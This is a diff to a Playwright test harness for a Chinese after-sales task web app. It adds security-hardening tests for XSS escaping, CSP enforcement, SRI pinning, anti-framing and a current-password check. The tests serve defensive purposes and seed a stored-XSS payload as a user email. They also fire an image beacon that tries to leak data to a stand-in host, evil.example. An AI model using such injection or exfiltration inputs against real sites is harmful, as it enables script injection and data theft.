@@ -94,9 +94,11 @@ window.prompt=()=>window.__prompt;window.confirm=()=>window.__confirm;window.ale
 HTMLInputElement.prototype.click=function(){window.__clicked.push({type:this.type,accept:this.accept})};
 `;
 
-async function open(browser, htmlPath, { db, admin = false, users = [], dark = false, pre = null }) {
-  const html = fs.readFileSync(htmlPath, "utf8");
-  const ctx = await browser.newContext({ acceptDownloads: true });
+async function open(browser, htmlPath, { db, admin = false, users = [], dark = false, pre = null, csp = false }) {
+  // the supabase-js script is replaced by a stub below, so drop its integrity hash (the real page keeps it)
+  const html = fs.readFileSync(htmlPath, "utf8").replace(/ integrity="[^"]*"/g, "");
+  // the page has a strict CSP (6.32); the harness evaluates code strings, so it bypasses CSP unless a test asks for the real policy (csp: true)
+  const ctx = await browser.newContext({ acceptDownloads: true, bypassCSP: !csp });
   await ctx.route("**/*", (route) => {
     const u = route.request().url();
     if (u.startsWith("https://radar.test/")) {
@@ -584,34 +586,41 @@ async function run(browser, htmlPath) {
 
   // ---- 6.21 admin resets a password (Edge Function stubbed) + change my password
   {
-    const { ctx, page } = await open(browser, htmlPath, { db: seed(), admin: true, users: [{ id: "u1", email: "a@x.com", is_admin: true }, { id: "p1", email: "8615770572452", is_admin: false }] });
+    const { ctx, page } = await open(browser, htmlPath, { db: seed(), admin: true, users: [{ id: "u1", email: "a@x.com", is_admin: true }, { id: "22222222-0000-4000-8000-0000000000a1", email: "8615770572452", is_admin: false }, { id: "33333333-0000-4000-8000-000000000bad", email: "x'+alert(document.domain)+'@evil.tld", is_admin: false }] });
     await page.waitForTimeout(300);
     await page.evaluate("adminPanel('users')"); await page.waitForTimeout(300);
     const btns = await page.evaluate("[...document.querySelectorAll('#admList button')].map(b=>b.textContent)");
-    check("6.21 users tab: 重置密码 for others, not for myself", btns.length === 1 && btns[0] === "重置密码" && (await text(page, "#admList")).includes("当前账号"), JSON.stringify(btns));
-    await page.evaluate("window.__confirm=false"); await page.click('#admList button:text-is("重置密码")'); await page.waitForTimeout(150);
+    const onclicks = await page.evaluate("[...document.querySelectorAll('#admList button')].map(b=>b.getAttribute('onclick'))");
+    check("6.32 XSS: 重置密码 buttons carry only a uuid (a quote in an email cannot break out)", onclicks.length === 2 && onclicks.every((o) => /^adminResetPassword\('[0-9a-f-]{36}'\)$/.test(o)), JSON.stringify(onclicks));
+    await page.evaluate("window.__confirm=false; window.__confirmText=''; window.confirm=(m)=>{window.__confirmText=m;return false}");
+    await page.click('#admList tr:has-text("evil.tld") button'); await page.waitForTimeout(150);
+    check("6.32 XSS: the evil email only shows up as text in the confirm box, nothing runs", (await page.evaluate("window.__confirmText")).includes("@evil.tld") && !(page.__errs || []).length);
+    await page.evaluate("window.confirm=()=>window.__confirm");
+    check("6.21 users tab: 重置密码 for others, not for myself", btns.length === 2 && btns[0] === "重置密码" && (await text(page, "#admList")).includes("当前账号"), JSON.stringify(btns));
+    await page.evaluate("window.__confirm=false"); await page.click('#admList tr:has-text("15770572452") button:text-is("重置密码")'); await page.waitForTimeout(150);
     check("6.21 reset asks first (with identity warning) -> cancel sends nothing", !(await page.evaluate("window.__fn")));
-    await page.evaluate(() => { window.__confirm = true; window.__fnReply = (n, o) => (n === "admin-reset-password" && o.body.user_id === "p1" ? { data: { ok: true, password: "Ab3$xyzPQR7k", account: "手机 15770572452" }, error: null } : { data: null, error: { message: "wrong call" } }); });
-    await page.click('#admList button:text-is("重置密码")'); await page.waitForTimeout(300);
+    await page.evaluate(() => { window.__confirm = true; window.__fnReply = (n, o) => (n === "admin-reset-password" && o.body.user_id === "22222222-0000-4000-8000-0000000000a1" ? { data: { ok: true, password: "Ab3$xyzPQR7k", account: "手机 15770572452" }, error: null } : { data: null, error: { message: "wrong call" } }); });
+    await page.click('#admList tr:has-text("15770572452") button:text-is("重置密码")'); await page.waitForTimeout(300);
     const fn = await page.evaluate("window.__fn.pop()");
-    check("6.21 reset calls the server function with the user id only", fn.name === "admin-reset-password" && JSON.stringify(fn.opts.body) === JSON.stringify({ user_id: "p1" }));
+    check("6.21 reset calls the server function with the user id only", fn.name === "admin-reset-password" && JSON.stringify(fn.opts.body) === JSON.stringify({ user_id: "22222222-0000-4000-8000-0000000000a1" }));
     const shown = await text(page, "#adminBody");
     check("6.21 temp password shown once with instructions", (await text(page, "#tmpPw")) === "Ab3$xyzPQR7k" && shown.includes("手机 15770572452") && shown.includes("修改密码") && shown.includes("不会记录密码"));
     await page.evaluate(() => { window.__fnReply = () => ({ data: null, error: { message: "non-2xx", context: { json: async () => ({ ok: false, code: "forbidden", message: "没有管理员权限" }) } } }); });
-    await page.evaluate("adminResetPassword('p1','手机 15770572452')"); await page.waitForTimeout(300);
+    await page.evaluate("adminUsers()"); await page.waitForTimeout(200); await page.evaluate("adminResetPassword('22222222-0000-4000-8000-0000000000a1')"); await page.waitForTimeout(300);
     check("6.21 server refusal shown, no password", (await text(page, "#adminBody")).includes("没有管理员权限") && !(await page.$("#tmpPw")));
-    // change my password
-    await page.evaluate("closeModal(); openSettings()"); await page.waitForTimeout(150);
-    await page.fill("#cp1", "abc"); await page.fill("#cp2", "abc"); await page.click("#cpBtn"); await page.waitForTimeout(100);
-    check("6.21 change pw: weak refused locally", (await text(page, "#toast")).includes("密码不符合要求") && !(await page.evaluate("(window.__auth||[]).some(a=>a.op==='update')")));
+    // change my password (6.32: current password required, checked on the server; other devices signed out)
+    await page.evaluate("closeModal(); openSettings(); window.__mailCalls=[]; window.__mailReply=(b)=>b.action==='change_password'?(b.password==='Oldpass1!'?{data:{ok:true,others_signed_out:true,status:{}},error:null}:{data:null,error:{message:'non-2xx',context:{json:async()=>({ok:false,code:'wrong_password',message:'当前密码不对（还可以再试 4 次）'})}}}):{data:{ok:true,status:{}},error:null}"); await page.waitForTimeout(150);
+    await page.fill("#cp1", "Newpass1!"); await page.fill("#cp2", "Newpass1!"); await page.click("#cpBtn"); await page.waitForTimeout(100);
+    check("6.32 change pw: current password required first", (await text(page, "#toast")).includes("请输入当前密码") && !(await page.evaluate("(window.__mailCalls||[]).length")));
+    await page.fill("#cp0", "Oldpass1!"); await page.fill("#cp1", "abc"); await page.fill("#cp2", "abc"); await page.click("#cpBtn"); await page.waitForTimeout(100);
+    check("6.21 change pw: weak refused locally", (await text(page, "#toast")).includes("密码不符合要求") && !(await page.evaluate("(window.__mailCalls||[]).length")));
     await page.fill("#cp1", "Newpass1!"); await page.fill("#cp2", "Newpass2!"); await page.click("#cpBtn"); await page.waitForTimeout(100);
     check("6.21 change pw: mismatch refused", (await text(page, "#toast")).includes("不一致"));
-    await page.fill("#cp2", "Newpass1!"); await page.click("#cpBtn"); await page.waitForTimeout(200);
-    const upd = await page.evaluate("(window.__auth||[]).filter(a=>a.op==='update').pop()");
-    check("6.21 change pw: updateUser({password}) + success + fields cleared", upd && upd.a.password === "Newpass1!" && (await text(page, "#toast")).includes("密码已修改") && (await page.inputValue("#cp1")) === "");
-    await page.evaluate("window.__updReply={data:null,error:{message:'New password should be different from the old password.'}}");
-    await page.fill("#cp1", "Newpass1!"); await page.fill("#cp2", "Newpass1!"); await page.click("#cpBtn"); await page.waitForTimeout(200);
-    check("6.21 change pw: same-as-old explained in Chinese", (await text(page, "#toast")).includes("不能和旧密码一样"));
+    await page.fill("#cp0", "Wrong1!x"); await page.fill("#cp2", "Newpass1!"); await page.click("#cpBtn"); await page.waitForTimeout(200);
+    check("6.32 change pw: wrong current password -> server message, nothing cleared", (await text(page, "#toast")).includes("当前密码不对") && (await page.inputValue("#cp1")) === "Newpass1!");
+    await page.fill("#cp0", "Oldpass1!"); await page.click("#cpBtn"); await page.waitForTimeout(200);
+    const cpc = await page.evaluate("window.__mailCalls.filter(c=>c.action==='change_password').pop()");
+    check("6.32 change pw: sent to the server with current + new password; success says other devices are out; fields cleared", cpc && cpc.password === "Oldpass1!" && cpc.new_password === "Newpass1!" && (await text(page, "#toast")).includes("其他设备") && (await page.inputValue("#cp0")) === "" && (await page.inputValue("#cp1")) === "" && !(await page.evaluate("(window.__auth||[]).some(a=>a.op==='update')")));
     check("6.21 no page errors", !(page.__errs || []).length, JSON.stringify(page.__errs));
     await ctx.close();
   }
@@ -666,7 +675,7 @@ async function run(browser, htmlPath) {
     check("6.23 是我本人 -> acknowledged on the server, closed", (await page.evaluate("window.__acked")) === 1 && (await page.evaluate("document.getElementById('modal').classList.contains('hidden')")));
     await page.evaluate("showLoginAlert(window.__loginAlerts.devices.filter(d=>d.is_new))"); await page.waitForTimeout(100);
     await page.click('#modalbox button:text-is("不是我，马上改密码")'); await page.waitForTimeout(500);
-    check("6.23 不是我 -> acknowledged + settings opened at 修改密码", (await page.evaluate("window.__acked")) === 2 && !!(await page.$("#cp1")) && (await page.evaluate("document.activeElement&&document.activeElement.id")) === "cp1");
+    check("6.23 不是我 -> acknowledged + settings opened at 修改密码", (await page.evaluate("window.__acked")) === 2 && !!(await page.$("#cp1")) && (await page.evaluate("document.activeElement&&document.activeElement.id")) === "cp0");
     await page.click('button:text-is("查看登录记录")'); await page.waitForTimeout(300);
     const rec = await text(page, "#loginRecs");
     check("6.23 登录记录 lists all devices, marks 本机", rec.includes("共 2 台设备") && rec.includes("Android · Edge") && rec.includes("本机") && rec.includes("Windows · Chrome"));
@@ -821,7 +830,7 @@ async function run(browser, htmlPath) {
     const rec = await text(page, "#loginRecs");
     check("6.27 after removal: list refreshed + note with 修改密码", rec.includes("共 2 台") && !rec.split("按最近使用排序")[1].includes("Windows · Chrome") && rec.includes("已删除「Windows · Chrome」") && rec.includes("强制退出") && rec.includes("修改密码"), rec.slice(0, 200));
     await page.click('#loginRecs button:text-is("修改密码")'); await page.waitForTimeout(400);
-    check("6.27 修改密码 -> settings at the password field", (await page.evaluate("document.activeElement&&document.activeElement.id")) === "cp1");
+    check("6.27 修改密码 -> settings at the password field", (await page.evaluate("document.activeElement&&document.activeElement.id")) === "cp0");
     await page.evaluate(`window.__removeReply = { ok: false, message: "不能删除你正在使用的这台设备" }`); await page.evaluate(`removeDevice('${ID_X}')`); await page.waitForTimeout(200);
     check("6.27 server refusal shown", (await text(page, "#toast")).includes("不能删除"));
     check("6.27 no page errors", !(page.__errs || []).length, JSON.stringify(page.__errs));
@@ -985,6 +994,38 @@ async function run(browser, htmlPath) {
     check("6.31 admin login also needs the agreement", (await text(r3.page, "#authmsg")).includes("请先阅读并勾选同意") && !(await r3.page.evaluate("(window.__auth||[]).length")));
     await r3.ctx.close();
   }
+  // ---- 6.32 security hardening: CSP actually enforced, page still works; pinned supabase-js with SRI; anti-framing
+  {
+    const { ctx, page } = await open(browser, htmlPath, { db: seed(), csp: true });
+    const violations = [];
+    page.on("console", (m) => { if (/Content Security Policy|Refused to/i.test(m.text())) violations.push(m.text()); });
+    await page.waitForTimeout(1200);
+    const appShown = await page.$eval("#app", (e) => !e.classList.contains("hidden"));
+    await page.click("#tasklist article"); await page.waitForTimeout(400);
+    const meta = await page.$eval('meta[http-equiv="Content-Security-Policy"]', (m) => m.content);
+    check("6.32 CSP: real policy in force, app opens and a task opens, no CSP violations", appShown && !(await page.$eval("#drawer", (e) => e.classList.contains("hidden"))) && !violations.length && /object-src 'none'/.test(meta) && /base-uri 'none'/.test(meta) && /connect-src 'self' https:\/\/bdnazzywqqmliqyhhtig\.supabase\.co wss:/.test(meta), JSON.stringify(violations));
+    const blocked = await page.evaluate(() => new Promise((res) => { const i = new Image(); i.onload = () => res(false); i.onerror = () => res(true); i.src = "https://evil.example/x.png?leak=1"; setTimeout(() => res(true), 1500); }));
+    check("6.32 CSP: sending data to another site (e.g. an image beacon) is blocked", blocked);
+    check("6.32 CSP: no page errors", !(page.__errs || []).length, JSON.stringify(page.__errs));
+    await ctx.close();
+    const src = fs.readFileSync(htmlPath, "utf8");
+    check("6.32 supabase-js pinned to an exact version with an SRI hash", /<script src="https:\/\/cdn\.jsdelivr\.net\/npm\/@supabase\/supabase-js@2\.\d+\.\d+\/dist\/umd\/supabase\.js" integrity="sha384-[A-Za-z0-9+\/=]{64}" crossorigin="anonymous"><\/script>/.test(src));
+    // framed by another site -> hidden
+    const c2 = await browser.newContext();
+    await c2.route("**/*", (route) => {
+      const u = route.request().url();
+      if (u.startsWith("https://evil.test/")) return route.fulfill({ status: 200, contentType: "text/html", body: '<iframe id="f" src="https://radar.test/index.html" style="width:400px;height:400px"></iframe>' });
+      if (u.startsWith("https://radar.test/")) return route.fulfill({ status: 200, contentType: "text/html; charset=utf-8", body: src.replace(/ integrity="[^"]*"/g, "") });
+      if (u.includes("@supabase/supabase-js")) return route.fulfill({ status: 200, contentType: "application/javascript", body: "window.supabase={createClient:()=>({auth:{getSession:async()=>({data:{session:null}}),onAuthStateChange(){return{data:{subscription:{unsubscribe(){}}}}}}})}" });
+      return route.abort();
+    });
+    const p2 = await c2.newPage();
+    await p2.goto("https://evil.test/").catch(() => {}); await p2.waitForTimeout(1200);
+    const fr = p2.frames().find((f) => f.url().startsWith("https://radar.test/"));
+    const hidden = fr ? await fr.evaluate(() => getComputedStyle(document.documentElement).display === "none").catch(() => true) : true;
+    check("6.32 anti-framing: inside another site's iframe the page stays hidden (or navigates away)", hidden || p2.url().startsWith("https://radar.test/"));
+    await c2.close();
+  }
   // ---- 6.18 phone accounts need admin approval (server enforces with RLS; page shows a clear message)
   {
     const { ctx, page } = await open(browser, htmlPath, { db: seed(), pre: { __noSession: true } });
@@ -1137,14 +1178,15 @@ async function run(browser, htmlPath) {
   // ---- more menu / settings / export / online
   await page.evaluate("more()");
   const mt = await text(page, "#modalbox");
-  check("more(): new entries present", ["夜间模式", "在线用户", "工作台设置", "导出 JSON 备份", "店铺中心", "云端资料库", "设备注册诊断"].every((x) => mt.includes(x)), mt);
+  check("more(): new entries present", ["夜间模式", "在线用户", "工作台设置", "导出 JSON 备份", "店铺中心", "云端资料库"].every((x) => mt.includes(x)) && !mt.includes("设备注册诊断"), mt);
   check("6.29 more(): normal login (even an admin account) has no 管理后台", !mt.includes("管理后台") && (await page.evaluate("document.getElementById('adminBtn').classList.contains('hidden')")));
   await page.evaluate("setMode('admin'); more()");
   check("6.29 more(): admin entry shows 管理后台", (await text(page, "#modalbox")).includes("管理后台"));
+  check("6.32 more(): debug tool 设备注册诊断 only in the admin entry", (await text(page, "#modalbox")).includes("设备注册诊断"));
   await page.evaluate("setMode('user')");
   await page.evaluate("openSettings()");
   const st = await text(page, "#modalbox");
-  check("settings: account/version/data-safety/export", st.includes("a@x.com") && st.includes("6.31.0") && st.includes("数据安全") && st.includes("导出 JSON 备份") && st.includes("每分钟"));
+  check("settings: account/version/data-safety/export", st.includes("a@x.com") && st.includes("6.32.0") && st.includes("数据安全") && st.includes("导出 JSON 备份") && st.includes("每分钟"));
   const [dl] = await Promise.all([page.waitForEvent("download"), page.evaluate("exportTasks()")]);
   const path = await dl.path(); const exp = JSON.parse(fs.readFileSync(path, "utf8"));
   check("export: JSON backup has tasks/stores/library + filename", exp.tasks.length === 3 && Array.isArray(exp.stores) && Array.isArray(exp.library) && /^after-sales-radar-backup-\d{4}-\d\d-\d\d\.json$/.test(dl.suggestedFilename()), dl.suggestedFilename());
